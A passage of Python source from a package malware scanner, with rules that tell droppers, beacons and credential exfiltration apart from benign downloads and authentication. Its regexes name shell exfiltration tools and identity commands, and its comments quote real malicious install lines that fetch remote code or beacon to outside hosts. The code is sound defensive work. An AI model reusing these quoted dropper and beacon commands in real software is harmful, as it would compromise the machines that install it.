        "CODECOV": ("codecov.io",),
        "OPENAI": ("openai.com",),
        "ANTHROPIC": ("anthropic.com",),
        "SLACK": ("slack.com",),
        "SENTRY": ("sentry.io",),
    }

    @classmethod
    def _credential_for_its_own_service(cls, content: FileContent) -> bool:
        """Every credential this Python file reads is handed straight to a call addressed to the
        service the credential is named for.

        lxml's build helper calls `read_url(url, github_api_token=os.environ.get(
        "GITHUB_API_TOKEN"))` with `url` bound to `https://api.github.com/...`: the token goes to
        the service that issued it, which is what a token is for. Judged per read and from the
        call the read is an argument of, never from what else the file contacts -- the same
        build also downloads zlib from `zlib.net`, without the token. A whole-environment read,
        a credential named for no service, or one read that goes anywhere else keeps the
        finding.
        """
        if not content.path.endswith(".py"):
            return False
        try:
            tree = PythonSyntax.shared(content.text)
        except (SyntaxError, ValueError, RecursionError):
            return False

        def environ(node: ast.AST) -> bool:
            return (
                isinstance(node, ast.Attribute)
                and node.attr == "environ"
                and isinstance(node.value, ast.Name)
                and node.value.id == "os"
            )

        parents: dict[int, ast.AST] = {}
        for node in PythonSyntax.nodes(tree):
            for child in ast.iter_child_nodes(node):
                parents[id(child)] = node

        def scope_of(node: ast.AST) -> int:
            current = parents.get(id(node))
            while current is not None and not isinstance(
                current, ast.FunctionDef | ast.AsyncFunctionDef | ast.Lambda
            ):
                current = parents.get(id(current))
            return id(current) if current is not None else id(tree)

        # Bindings per function: `url` is assigned in many functions of a build script, and
        # the one that matters is the one in the function making the call.
        bound: dict[tuple[int, str], list[ast.AST]] = {}
        for node in PythonSyntax.nodes(tree):
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        bound.setdefault((scope_of(node), target.id), []).append(node.value)

        def urls_in(call: ast.Call) -> list[str]:
            found: list[str] = []
            for argument in [*call.args, *(k.value for k in call.keywords)]:
                values: list[ast.AST] = [argument]
                key = (scope_of(argument), argument.id) if isinstance(argument, ast.Name) else None
                if key is not None and len(bound.get(key, [])) == 1:
                    values = bound[key]
                for value in values:
                    for inner in PythonSyntax.nodes(value):
                        if isinstance(inner, ast.Constant) and isinstance(inner.value, str):
                            found.extend(
                                m.group(1).lower() for m in cls._URL_HOST.finditer(inner.value)
                            )
            return found

        from cordon_scanner.analysis.python.pyast import PythonAnalyzer

        handed = PythonAnalyzer.excused_lines(content.text).get(Capability.CREDENTIAL, frozenset())
        reads = 0
        for node in PythonSyntax.nodes(tree):
            key: str | None = None
            if (
                environ(node)
                and not isinstance(parents.get(id(node)), ast.Subscript | ast.Attribute)
                and getattr(node, "lineno", 0) not in handed
            ):
                return False  # the environment as a whole, other than handed to a child
            if isinstance(node, ast.Call) and node.args and isinstance(node.args[0], ast.Constant):
                func = node.func
                if (
                    isinstance(func, ast.Attribute) and func.attr == "get" and environ(func.value)
                ) or (isinstance(func, ast.Attribute) and func.attr == "getenv"):
                    key = str(node.args[0].value)
            elif (
                isinstance(node, ast.Subscript)
                and environ(node.value)
                and isinstance(node.slice, ast.Constant)
            ):
                key = str(node.slice.value)
            if key is None or not CREDENTIAL_VARIABLE.search(key):
                continue
            reads += 1
            service = next(
                (
                    domains
                    for prefix, domains in cls.SERVICE_HOSTS.items()
                    if key.upper() == prefix or key.upper().startswith(prefix + "_")
                ),
                None,
            )
            carrier = parents.get(id(node))
            while isinstance(
                carrier,
                ast.keyword
                | ast.BinOp
                | ast.JoinedStr
                | ast.FormattedValue
                | ast.BoolOp
                | ast.Dict,
            ):
                carrier = parents.get(id(carrier))
            if service is None or not isinstance(carrier, ast.Call):
                return False
            hosts = urls_in(carrier)
            if not hosts or not all(
                any(h == d or h.endswith("." + d) for d in service) for h in hosts
            ):
                return False
        return reads > 0

    """Callees that run a function they are handed, without anybody asking again."""

    ON_REQUEST_RULES = frozenset(
        {
            "SUSPECT.DROPPER.001",
            "SUSPECT.DROPPER.REMOTE_CODE.001",
            "SUSPECT.DYNAMIC_DISPATCH.001",
            "SUSPECT.EXFIL.BEACON.001",
            "SUSPECT.ANTI_ANALYSIS.001",
            "SUSPECT.DECODE_EXEC.001",
            "SUSPECT.MODEL.LOADED_ON_IMPORT.001",
            "SUSPECT.PERSIST.001",
        }
    )
    """Composites lowered when nothing on the load path runs them. A dynamic import in the method
    of a YAML library that resolves `!!python/name:` tags is that library's feature, and a
    function that checks for GitHub Actions before minting its OIDC token is doing its job; the
    same code at a module's top level, or in a hook, is not lowered."""
    """Dunders that run when a class is defined, subclassed or parameterised, not when it is
    instantiated. `__new__` is here because a metaclass's `__new__` runs at class definition."""

    DROPPER_RULE = "SUSPECT.DROPPER.001"
    #: The flow dropper (a response reaching execute/process, including written to disk then run --
    #: review 98 round 2 B). Lowered like DROPPER_RULE when the download is a verified own release,
    #: so a sha256-checked self-update stays below the gate; kept out of VERIFIABLE_DROPPERS so the
    #: no-download-run escalations do not apply to it.
    REMOTE_CODE_RULE = "SUSPECT.DROPPER.REMOTE_CODE.001"
    #: Malware grade -> its suspect grade, which a verified download leaves reporting (review 98 #28).
    WITHDRAWN_WHEN_VERIFIED: ClassVar[dict[str, str]] = {
        "MALWARE.DROPPER.001": DROPPER_RULE,
        "MALWARE.INSTALL.REMOTE_CODE.001": REMOTE_CODE_RULE,
    }

    #: Rules whose act is destroying data. They keep their severity in build tooling: a recipe
    #: runs unattended on every machine that builds, so "written to be read" does not hold.
    DESTRUCTION_RULES: ClassVar[frozenset[str]] = frozenset(
        {"SUSPECT.DESTROY.HOME_OR_ROOT.001", "MALWARE.PROTESTWARE.001"}
    )

    @staticmethod
    def _official_installs_only(content: FileContent, hits: list[CapabilityHit]) -> bool:
        from cordon_scanner.detect.code.verified_download import VerifiedDownload

        return VerifiedDownload.official_installs_only(content.raw, hits)

    BEACON_RULE: ClassVar[str] = "MALWARE.EXFIL.BEACON.001"
    #: Dataflow facts: the machine's identity reaches what a request sends.
    IDENTITY_FLOWS: ClassVar[frozenset[str]] = frozenset(
        {"AST.PY.IDENTITY_SENT", "FLOW.JS.IDENTITY_SENT"}
    )
    #: The two grades of the same dropper pattern, the only findings `VerifiedDownload` may lower.
    VERIFIABLE_DROPPERS: ClassVar[frozenset[str]] = frozenset(
        {"MALWARE.DROPPER.001", "SUSPECT.DROPPER.001"}
    )
    VERIFIED_DOWNLOAD_REASON = (
        "a checksum-verified download of the package's own release; whoever owns the release "
        "also owns the checksum, so the binary itself is not vouched for"
    )

    @staticmethod
    def _verified_release_download(
        unit: FileUnit, ctx: ScanContext, file_hits: list[CapabilityHit]
    ) -> bool:
        from cordon_scanner.detect.code.verified_download import VerifiedDownload

        if not ctx.package_distribution:
            # Condition (b) places the digest in the package, and only a published package's
            # members are known to be what the consumer receives beside the script. A listed
            # tool's own release is pinned by its URL alone (`official_install`), wherever it is.
            return VerifiedDownload.official_install(unit.content.text, unit.language, file_hits)
        return VerifiedDownload.verified(
            unit.content.text,
            unit.language,
            unit.content.path,
            file_hits,
            ctx.tree_paths,
            # Condition (c), the package's own `repository` (`ScanContext.package_repository`):
            # a release on github.com is the package's only if its owner and repository match.
            # Hosts with no owner in the path (the npm registries, nodejs.org) do not need it.
            ctx.package_repository or None,
        ) or VerifiedDownload.package_install(
            unit.content.text, unit.language, file_hits, ctx.package_repository or None, ctx
        )

    #: Who this machine is, in shell: a command's output or the variable the shell fills in.
    #: `$USER` is left out -- scripts assign it from their own settings (`USER="$NZBGET_USER"`).
    _SHELL_IDENTITY = re.compile(
        r"\$\(\s*(?:hostname|whoami|id\s+-un|uname\s+-n|scutil\s+--get\s+\w+)\b|`\s*(?:hostname|whoami)\b"
        r"|\$\{?HOSTNAME\b"
    )
    _SHELL_ASSIGNED = re.compile(r"^\s*(?:export\s+|local\s+)?([A-Za-z_]\w*)=(.*)$", re.S)
    _SHELL_SENDER = re.compile(r"\b(?:curl|wget|nc|ncat|nslookup|dig|Invoke-WebRequest|iwr)\b")

    @classmethod
    def _identity_in_what_is_sent(
        cls, language: str | None, content: FileContent, hits: list[CapabilityHit]
    ) -> bool:
        """Whether the file puts the machine's identity into what it sends, for a language whose
        flow is read: the dataflow facts for Python and JavaScript, and for shell the identity
        -- directly or through a variable assigned from it -- on a line that sends. A language
        with no flow read answers True, so nearness keeps deciding there."""
        if language in ("python", "javascript", "typescript"):
            return any(h.rule_id in cls.IDENTITY_FLOWS for h in hits)
        if language != "shell":
            return True
        carrying: set[str] = set()
        # A command continued over several lines with `\` is one line to the shell, and so is a
        # command substitution: `PAYLOAD="$(python3 - <<EOF ... EOF)"` is one assignment.
        lines = cls._shell_statements(re.sub(r"\\\r?\n", " ", content.text).splitlines())
        for _ in range(2):
            for line in lines:
                assigned = cls._SHELL_ASSIGNED.match(line)
                if assigned and cls._carries_identity(assigned[2], carrying):
                    carrying.add(assigned[1])
        return any(
            cls._SHELL_SENDER.search(line) and cls._carries_identity(line, carrying)
            for line in lines
        )

    @staticmethod
    def _shell_statements(lines: list[str]) -> list[str]:
        """Lines, with a `$(` left open joined to the lines up to the one that closes it."""
        out: list[str] = []
        index = 0
        while index < len(lines):
            line = lines[index]
            depth = line.count("$(") + line.count("(") - line.count("$(") - line.count(")")
            end = index
            while "$(" in line and depth > 0 and end + 1 < len(lines) and end - index < 200:
                end += 1
                line += "\n" + lines[end]
                depth += lines[end].count("(") - lines[end].count(")")
            out.append(line)
            index = end + 1
        return out

    @classmethod
    def _carries_identity(cls, text: str, carrying: set[str]) -> bool:
        # A variable is read as `$NAME` by the shell, or -- once exported -- by the program a
        # substitution runs: `os.environ["NAME"]`, `getenv("NAME")`, `process.env.NAME`.
        return cls._SHELL_IDENTITY.search(text) is not None or any(
            re.search(
                rf"\$\{{?{re.escape(name)}\b|environ\s*\[\s*[\"']{re.escape(name)}[\"']"
                rf"|getenv\s*\(\s*[\"']{re.escape(name)}[\"']|process\.env\.{re.escape(name)}\b",
                text,
            )
            for name in carrying
        )

    def _suspect_dropper_reports(
        self, ctx: ScanContext, path: str, hits: list[CapabilityHit], rule: str = DROPPER_RULE
    ) -> bool:
        """Whether the suspect grade (`SUSPECT.DROPPER.001`) fires on the window its malware grade
        matched: its `unless` excludes test paths, and withdrawing the one where the other does
        not report would leave the file clean."""
        suspect, fired = ctx.rules.get(rule), frozenset(hit.rule_id for hit in hits)
        return suspect is not None and self._evaluate(
            suspect, {hit.capability for hit in hits}, path, in_hook=True, fired=fired
        )

    """A file inside an agent skill's folder (`.claude/skills/<name>/scripts/x.py` and kin)."""

    @staticmethod
    def _skill_script(path: str, ctx: ScanContext | None) -> bool:
        """`LoadPath.skill_script`, asked through the detector: the engine's `_skill_scripts` reaches
        it here, over the engine-to-detector import it already has."""
        return LoadPath.skill_script(path, ctx)

    @staticmethod
    def _agent_run(content: FileContent, ctx: ScanContext | None) -> bool:
        """A skill's script or an MCP server's own source: code an agent runs as a tool."""
        if LoadPath.skill_script(content.path, ctx):
            return True
        if ctx is not None and content.path in ctx.agent_run_paths:
            return True
        from cordon_scanner.engine.engine import Engine

        member = content.path.rpartition("!")[2]
        return (
            member.endswith((".js", ".mjs", ".cjs", ".ts", ".mts", ".py"))
            and not Engine._NOT_A_SERVER_PATH.search(member)
            and Engine._MCP_SDK_IMPORT.search(content.text[:200_000]) is not None
        )

    @staticmethod
    def _tool_runs_nothing_downloaded(unit: FileUnit, ctx: ScanContext) -> bool:
        """An agent's tool script that fetches and runs, but never runs what it fetched.

        A skill's helper is run by the agent on request, and `curl "$api" | jq` beside
        `python3 -c` is what such a script does. Install-time code keeps the co-occurrence
        rule: there the pair is the attack. See `detect/download_flow.py` for what is followed
        and the measurement; a language it does not read keeps the co-occurrence verdict.
        """
        from cordon_scanner.detect.code.download_flow import DownloadFlow

        content = unit.content
        if content.path in ctx.consumer_install_paths or not CapabilityDetector._agent_run(
            content, ctx
        ):
            return False
        return DownloadFlow.runs_download(content.text, unit.language) == []

    """Languages with no load path: importing a Go package or referencing a Java class runs none of
    its functions, except the initialisers matched by `_LOAD_TIME_INITIALISER`."""
    """Go's `func init()`, Java's `static { ... }`, a C# static constructor, a C/C++
    `__attribute__((constructor))` and Rust's `#[ctor]`: code that runs when the package is imported,
    the class is loaded or the library is mapped -- how malicious modules run their payload."""

    @staticmethod
    def _satisfying_region(content: FileContent, hits: list[CapabilityHit]) -> bytes:
        """The bytes the composite actually matched across, plus a margin.

        A window around the ANCHOR is the wrong region to look in. The anchor is one
        of several hits and not necessarily the fetch: in Elasticsearch's
        `setup_node.sh` the anchor landed 400 bytes away from the `curl`, so the pin in
        the URL was outside the window and the file was still called malware.

        The composite matched because a SET of hits sat close enough together, so that
        set is the region any statement about the match has to be made over.
        """
        if not hits:
            return b""
        start = min(hit.byte_start for hit in hits)
        end = max(hit.byte_end for hit in hits)
        return content.raw[max(0, start - 200) : end + 200]

    #: A fetch whose target is identified by something immutable.
    #:
    #: A version in the path, a release asset under a tag, a commit digest, or a
    #: checksum verified nearby. Any of those means the bytes that arrive are the bytes
    #: somebody chose, so the fetch is reviewable even though it crosses the network.
    #:
    #: What this separates, and why it is worth a category rather than a severity: the
    #: Codecov bash uploader was `curl -s https://codecov.io/bash | bash` -- no version,
    #: nothing to verify, and whatever the host served that day is what ran. That is the
    #: attack `MALWARE.DROPPER.001` is named for. Elasticsearch's
    #: `.buildkite/scripts/setup_node.sh` runs
    #: `curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.4/install.sh | bash`,
    #: which is the same four shell tokens and a completely different proposition.
    #:
    #: Deliberately NOT "the host is well known". A popular host is not a control, and
    #: a list of trusted domains is a list somebody will add to.
    PINNED_FETCH = re.compile(
        rb"""(?ix)
        (?:
            /v?\d+\.\d+(?:\.\d+)?/          # a version as a path segment
          | /releases/download/[^/\s]+/       # a release asset under a tag
          | /archive/refs/tags/                # a tagged source archive
          | @[0-9a-f]{40}\b                   # a git commit pin
          | [?&](?:ref|sha|commit)=[0-9a-f]{7,40}\b
          | sha(?:1|256|512)sum[ \t]+(?:-c|--check)
          | gpg[^\n]{0,80}--verify
          | cosign[ \t]+verify
        )
        """,
        re.VERBOSE | re.IGNORECASE,
    )

    CREDENTIAL_STORE_RULE = "SUSPECT.EXFIL.CREDENTIAL_STORE.001"
    """The one composite the authentication-filename ceiling applies to."""

    """Egress to an out-of-band interaction service. See `intel.hosts.INTERACTION_HOSTS`."""
    """Rule id for egress to a destination that is itself informative.

    Named so composites can refer to it. It is a capability label rather than a
    finding, like the AST tier's, and it exists because the capability model
    deliberately cannot tell one outbound request from another -- posting to a
    metrics endpoint and posting to a Discord webhook are both `egress`.
    """

    # -- Reasoning -------------------------------------------------------

    def _composite_findings(
        self,
        unit: FileUnit,
        ctx: ScanContext,
        hits: list[CapabilityHit],
        candidates: tuple[CompiledRule, ...],
    ) -> Iterable[Finding]:
        if not hits:
            return

        # Depth is summed over distinct operations rather than over rules. One
        # decode rule covers base64, hex and decompression, so counting rules
        # cannot tell one decoding step from three.
        #
        # The AST tier is excluded. It is a second view of the same call --
        # resolving what a pattern could not see, not finding another decode --
        # so counting it too would make every parsed Python file appear to
        # decode twice. That reasoning lives in `_evaluate_over`, which is
        # where the counting now happens, because a composite with a proximity
        # counts what is inside its window rather than what is in the file.
        in_hook = ctx.in_install_hook(unit.path)
        in_ci = ctx.in_ci_hook(unit.path)
        in_consumer = ctx.in_consumer_install(unit.path)
        # Read by the `install_entry` term. Composites are evaluated one file at a time.
        self._in_entry = unit.path in ctx.install_entry_paths
        # A published package's own entry point, run on `require()`/`import` (REC-2).
        self._in_import_entry = unit.path in ctx.import_entry_paths
        # Install-time context is decided per WINDOW, not per file. A file is in
        # the closure because a hook imports it, and importing a module defines
        # its functions without calling them -- so a pair of capabilities inside
        # a body nothing reaches does not run at install time, whatever the file
        # does. See `ScanContext.install_hook_reaches`.
        deferred = (
            frozenset(
                (first, last)
                for path, first, last in ctx.install_deferred_lines
                if path == unit.path
            )
            if in_hook
            else frozenset()
        )

        decode_excused = DecodeRun.excused_lines(
            unit, hits, BuildOutput.bundled_path(unit.path), [c.rule.id for c in candidates]
        )
        for compiled in candidates:
            if compiled.match.kind is not MatchKind.COMPOSITE:
                continue
            if compiled.match.scope not in {"file", "function"}:
                continue

            rule_hits = (
                [h for h in hits if not self._a_setting(unit.content, h)]
                if compiled.rule.id in self.SETTINGS_ARE_NOT_LOOT
                else [h for h in hits if not InstallPayload.spawns_unpacker(unit.content, h)]
                if compiled.rule.id in self.VERIFIABLE_DROPPERS
                else DecodeRun.hits_for(compiled.rule.id, hits, decode_excused)
            )
            if compiled.rule.id in self.CONTEXT_FREE:
                window = self._satisfying_window(
                    compiled, rule_hits, unit.path, False, False, False, frozenset()
                )
            else:
                window = self._satisfying_window(
                    compiled, rule_hits, unit.path, in_hook, in_ci, in_consumer, deferred
                )
            if window is None:
                continue

            matched_capabilities = self._capabilities_of(compiled)
            if Capability.EGRESS in matched_capabilities and (
                (
                    Capability.CREDENTIAL in matched_capabilities
                    and self._credential_reaches_its_own_issuer(unit.content, window)
                )
                # Not at install time: nothing installing a package needs its user's keys, and
                # boto3 uploads just as well to a bucket the attacker owns.
                or (not in_hook and self._store_used_by_its_own_client(unit.content, window))
                or (
                    not in_hook
                    and compiled.rule.id == self.CREDENTIAL_STORE_RULE
                    and KeychainOwner.excuses(unit.content, window, hits)
                )
            ):
                # Authentication, not exfiltration. See `_credential_reaches_its_own_issuer`,
                # `_store_used_by_its_own_client` and `keychain_owner`.
                continue

            local_by_capability = {hit.capability: hit for hit in window}
            if InstallPayload.gate(
                compiled.rule.id, in_hook or in_consumer, local_by_capability, window, unit, ctx
            ):
                continue
            matched = matched_capabilities
            anchor = self._anchor(matched, local_by_capability, window)

            finding = self._composite_finding(
                compiled, unit, ctx, anchor, matched, window, file_hits=hits
            )
            if finding is not None:
                yield finding

    #: Composites whose source half is what a file sends: a setting it reads to configure itself is
    #: not that. See `_a_setting`.
    SETTINGS_ARE_NOT_LOOT: ClassVar[frozenset[str]] = frozenset({"SUSPECT.EXFIL.DROP_POINT.001"})

    _SETTING_READ: ClassVar[re.Pattern[str]] = re.compile(
        r"""^\s{0,8}(?:
            process\.env\.(?P<dotted>[A-Za-z_][A-Za-z0-9_]{0,80})\b(?!\s{0,4}[\[(])
          | (?:os\.(?:getenv|environ\.get|environ\s{0,4}\[)|process\.env\s{0,4}\[
             |std::env::var(?:_os)?\s{0,4}\(|env!\s{0,4}\(|ENV(?:\.fetch\s{0,4}\(|\s{0,4}\[)
             |System\.getenv\s{0,4}\(|Environment\.GetEnvironmentVariable\s{0,4}\(
             |os\.Getenv\s{0,4}\()
            \s{0,4}\(?\s{0,4}["'](?P<quoted>[A-Za-z_][A-Za-z0-9_]{0,80})["']
        )""",
        re.VERBOSE,
    )
    """One environment variable read by its literal name: `os.getenv("TELEGRAM_BOT_TOKEN")`,
    `process.env.DINGTALK_TOKEN`, `std::env::var("SMTP_SERVER")`. A name computed at run time
    (`os.getenv(k)`) is not this: a loop over names is how a stealer reads a list of them."""

    _PLATFORM_LOOKUP: ClassVar[re.Pattern[str]] = re.compile(
        r"^\s{0,8}(?:platform\.(?:machine|system|architecture|processor|python_version)\s{0,4}\("
        r"|os\.(?:homedir|platform|arch|tmpdir|cpus|endianness)\s{0,4}\("
        r"|process\.(?:platform|arch)\b|sys\.platform\b)"
    )
    """What the machine is, not who: the architecture a download is picked for, the home
    directory a config file is kept under."""

    @classmethod
    def _a_setting(cls, content: FileContent, hit: CapabilityHit) -> bool:
        """Whether a credential or reconnaissance hit reads only a setting the file configures
        itself with, so that it is not what a request to a drop point carries away.

        A notifier reads its bot token and posts a message; a stealer reads the environment, the
        user and host names, or the public address, and posts those (review 98: the 62 benign
        units blocked by `SUSPECT.EXFIL.DROP_POINT.001` alone against 16 malware samples, every
        one of which sends identity or the whole environment). A named setting that is a
        well-known credential of another service (`NPM_TOKEN`, `GITHUB_TOKEN`, AWS keys -- see
        `secretflow.CREDENTIAL_HOMES`) is loot whatever reads it.
        """
        if hit.capability not in (Capability.CREDENTIAL, Capability.RECONNAISSANCE):
            return False
        if hit.rule_id.endswith("_SENT") or "PUBLIC_IP" in hit.rule_id:
            return False
        end = min(hit.byte_end, hit.byte_start + 240)
        text = content.raw[hit.byte_start : max(end, hit.byte_start + 1)].decode("utf-8", "replace")
        if cls._PLATFORM_LOOKUP.match(text):
            return True
        read = cls._SETTING_READ.match(text)
        if read is None:
            return False
        from cordon_scanner.analysis.shared.credential_homes import CREDENTIAL_HOMES

        name = read.group("dotted") or read.group("quoted") or ""
        return not any(pattern.match(name) for pattern, _ in CREDENTIAL_HOMES)

    BYTES_PER_LINE = 200
    """How far apart in bytes `proximity` lines are allowed to be.

    Proximity is a line count, and a minifier deletes lines. On a bundle the
    whole file is line 1, so "within five lines" means "anywhere in the file"
    and a composite that was written to say *this file does both things in the
    same breath* silently becomes *this file does both things*.

    `ethers`, the most used Ethereum library there is, showed this: two hits at
    line 1 of `dist/ethers.min.js`, thousands of bytes apart, reported as
    private key material sent to the network at CRITICAL. And a MALICIOUS
    composite is deliberately exempt from the minified ceiling -- malware is not
    excused for being generated -- so nothing downstream would have caught it.

    Two hundred bytes a line is generous for real source, where the mean is
    nearer forty, so this never narrows a window on code somebody wrote by hand.
    What it does is stop a window from spanning a bundle."""

    MAX_PROXIMITY_HITS = 400
    """Above this many capability hits, the pairwise search gives way to `_dense_window`.

    The search is quadratic in the number of hits, and a file with four hundred of them is
    generated or enormous. It used to fall back to file scope there -- reporting more, on the
    theory that more is safe -- which made every large bundle a single window."""

    def _satisfying_window(
        self,
        compiled: CompiledRule,
        hits: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool = False,
        deferred: frozenset[tuple[int, int]] = frozenset(),
    ) -> list[CapabilityHit] | None:
        """The hits that satisfy this composite, or `None` if none do.

        With no `proximity` the window is the whole file, which is what every
        composite meant before proximity existed. With one, the capabilities
        must appear within that many lines of each other -- so a claim that a
        file fetches and executes becomes a claim that one *part* of it does,
        which is what the message has always said.
        """
        proximity = compiled.match.proximity
        if (
            proximity > 0
            and in_hook
            and hits
            and (
                max(h.line for h in hits) <= self.SMALL_HOOK_LINES
                # Lines of ordinary length: a minified bundle's 300 lines are a whole library.
                and max(h.byte_start for h in hits) <= 160 * self.SMALL_HOOK_LINES
                # And written by hand: an editor extension's compiled entry is a bundle whose
                # first hundred lines hold unrelated libraries (review 98: about twenty Open VSX
                # AI-coding extensions read as one install-time act).
                and not BuildOutput.bundled_path(path)
            )
        ):
            # An install script a few hundred lines long runs top to bottom, and its parts are one
            # act: `@testcarrot/supply6` reads the username in one function and writes it to a raw
            # socket from another 25 lines below, past a 30-line window (review 98). Proximity
            # separates the halves of a library; it does not separate the halves of a hook.
            proximity = 0
        if proximity <= 0:
            if self._evaluate_over(
                compiled, hits, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return hits
            return None
        if len(hits) > self.MAX_PROXIMITY_HITS:
            return self._dense_window(
                compiled, hits, path, in_hook, in_ci, in_consumer, deferred, proximity
            )

        # Sorted by line ALONE, and stably. Adding `byte_start` to the key looks
        # harmless and is not: a window is `ordered[index:]`, so it drops every
        # hit that sorts earlier, and the AST tier's `fixed` marker sits on the
        # same line as the pattern hit it qualifies. Reordering the two put the
        # marker behind the window, `fixed_lines` came out empty, and
        # `subprocess.run(["git", "rev-parse", "HEAD"])` -- an argv written out
        # in full -- satisfied `SUSPECT.DECODE_EXEC.001` again. The existing
        # test for it is what caught this.
        ordered = sorted(hits, key=lambda h: h.line)
        byte_limit = proximity * self.BYTES_PER_LINE
        for index, first in enumerate(ordered):
            limit = first.line + proximity
            window = [
                h
                for h in ordered[index:]
                if h.line <= limit and abs(h.byte_start - first.byte_start) <= byte_limit
            ]
            if self._evaluate_over(
                compiled, window, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return window
        return None

    SMALL_HOOK_LINES: ClassVar[int] = 300
    """Install-time code whose every capability sits within this many lines is one window."""

    def _dense_window(
        self,
        compiled: CompiledRule,
        hits: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool,
        deferred: frozenset[tuple[int, int]],
        proximity: int,
    ) -> list[CapabilityHit] | None:
        """Proximity over a file with more hits than the pairwise search affords.

        The file used to be one window past `MAX_PROXIMITY_HITS`, which in a bundle means any
        credential read and any request anywhere in ten megabytes are "together": a 27 MB agent
        extension's secret-redaction table (`hooks.slack.com/<redacted>`) and its help text
        (`"Read(~/.zshrc)"`) were blocked as malware (review 98). Here each hit is the centre of
        the bytes within `proximity * BYTES_PER_LINE` either side, found by bisection over the
        hits sorted by offset -- symmetric, so a marker that sorts just before its pattern hit is
        still in the window -- and a window identical to the last is not evaluated twice.
        """
        import bisect

        byte_limit = proximity * self.BYTES_PER_LINE
        by_byte = sorted(hits, key=lambda h: h.byte_start)
        starts = [h.byte_start for h in by_byte]
        last: tuple[int, int] | None = None
        for centre in by_byte:
            lo = bisect.bisect_left(starts, centre.byte_start - byte_limit)
            hi = bisect.bisect_right(starts, centre.byte_start + byte_limit)
            if (lo, hi) == last:
                continue
            last = (lo, hi)
            window = [h for h in by_byte[lo:hi] if abs(h.line - centre.line) <= proximity]
            if self._evaluate_over(
                compiled, window, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return window
        return None

    def _evaluate_over(
        self,
        compiled: CompiledRule,
        window: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool = False,
        deferred: frozenset[tuple[int, int]] = frozenset(),
        *,
        all_hits: list[CapabilityHit] | None = None,
    ) -> bool:
        all_hits = window if all_hits is None else all_hits
        # A spawn whose whole argv is written out in the source does not count.
        #
        # Every composite that names `spawn` uses it as evidence that something
        # unknown runs -- decoded data, a downloaded file, a credential's worth of
        # harvested output. `subprocess.run(["git", "rev-parse", "--short", "HEAD"])`
        # cannot be any of those: what it runs is in the file, in front of the
        # reader.
        #
        # `NousResearch/hermes-agent` produced eleven `SUSPECT.DECODE_EXEC.001`
        # anchored on exactly that shape -- `["ldd", "--version"]`, `["launchctl",
        # "list", label]`, `["git", "rev-parse"]` -- each paired with a base64
        # decode somewhere else in the file. Across the corpus `SUSPECT.DECODE_EXEC
        # .001` was 684 findings in 252 of 1,487 repositories.
        #
        # What keeps the real cases is that a constant argv is ANALYSED rather than
        # trusted: `os.system("curl x | sh")` is constant too, and the embedded-shell
        # tier extracts the fetch and the pipe from it as capabilities of their own,
        # which satisfy the composite on their own terms. And a constant command
        # naming a temporary or relative path is not treated as fixed at all, because
        # that is where a dropper puts its payload.
        # By LINE, not by hit. The pattern tier and the AST tier both see the same
        # call -- `CAP.PY.SPAWN.001@222` and `AST.PY.SPAWN@222` -- and only the AST
        # tier can say whether the argv was written out, so dropping its own hit
        # alone left the pattern tier's to satisfy the term anyway.
        # Unless the argv that was written out is ITSELF the act. The discount rests
        # on one claim -- that a spawn whose whole command is visible cannot be
        # running something decoded or downloaded -- and that claim holds for
        # `subprocess.run(["git", "rev-parse", "--short", "HEAD"])` and fails
        # completely for `os.system("curl https://kotko.me/analyze.php?procoder")`.
        # Both are fully literal. In the second the literal is the attack, and being
        # readable is not the same as being harmless.
        #
        # So a line whose command carried a capability of its own keeps its spawn.
        # `CAP.SH.*` is the marker for that: those hits exist only because the shell
        # rules were applied to the command string a spawn was handed, so one on this
        # line means the argv itself fetches, decodes or persists.
        #
        # Measured. `procoder`'s `setup.py` is `os.system("curl <url>")` and nothing
        # else; the spawn was discounted, only `egress` survived, and
        # `MALWARE.DROPPER.001` needs both -- so an install-time beacon in four lines
        # of Python produced no finding. Six of the packages still missed after the
        # reconnaissance work were this shape, `duc193`'s
        # `os.system("wget -O ~/.mal/.neofetch.py <url>")` among them.
        #
        # Computed over every hit in the FILE rather than over the window, and
        # that is load-bearing rather than tidy. "This line's argv is written
        # out in full" is a fact about the line; which window happens to be
        # under evaluation cannot change it. Scoping it to the window made the
        # discount depend on hit ORDER, because a window is `ordered[index:]`
        # and drops everything sorting earlier -- so a window starting at a
        # spawn hit that sorted after the `fixed` marker on the same line
        # contained no marker at all, `fixed_lines` came out empty, and the
        # discount silently did not apply.
        #
        # This is the second time that shape has bitten. The comment on
        # `ordered` records the first: adding `byte_start` to the sort key
        # reordered the marker behind the window and `subprocess.run(["git",
        # "rev-parse", "--short", "HEAD"])` satisfied `SUSPECT.DECODE_EXEC.001`
        # again. It was fixed by preserving the order, which left the real
        # fragility in place -- appending any new spawn-labelling tier after
        # the marker reproduced it exactly, and adding the `ast` match kind
        # did. Taking the fact from the file removes the ordering dependency
        # instead of restating the rule that protects it.
        speaking_argv = {
            hit.line
            for hit in all_hits
            if hit.rule_id.startswith("CAP.SH.") and hit.capability is not Capability.SPAWN
        }
        fixed_lines = {hit.line for hit in all_hits if hit.fixed} - speaking_argv
        window = [
            hit
            for hit in window
            if not (hit.capability is Capability.SPAWN and hit.line in fixed_lines)
        ]
        # The file runs at install time; this window has to as well. If any hit
        # in it sits in a body the hooks never call, the pair the composite
        # describes is not something that happens during an install -- so the
        # `context: install_hook` term is not satisfied for THIS window, even
        # though it is for the file.
        #
        # `any` rather than `all`: the claim is that these capabilities occur
        # together during an install, and one half of the pair sitting in dead
        # code is enough for that not to be true.
        if in_hook and deferred and any(LineRanges.cls_in(hit.line, deferred) for hit in window):
            in_hook = False

        present = {hit.capability for hit in window}
        counts: Counter[Capability] = Counter()
        for hit in window:
            if not hit.resolved:
                counts[hit.capability] += hit.variants
        fired = frozenset(hit.rule_id for hit in window)
        return self._evaluate(compiled, present, path, in_hook, counts, fired, in_ci, in_consumer)

    def _evaluate(
        self,
        compiled: CompiledRule,
        present: set[Capability],
        path: str,
        in_hook: bool = False,
        counts: Counter[Capability] | None = None,
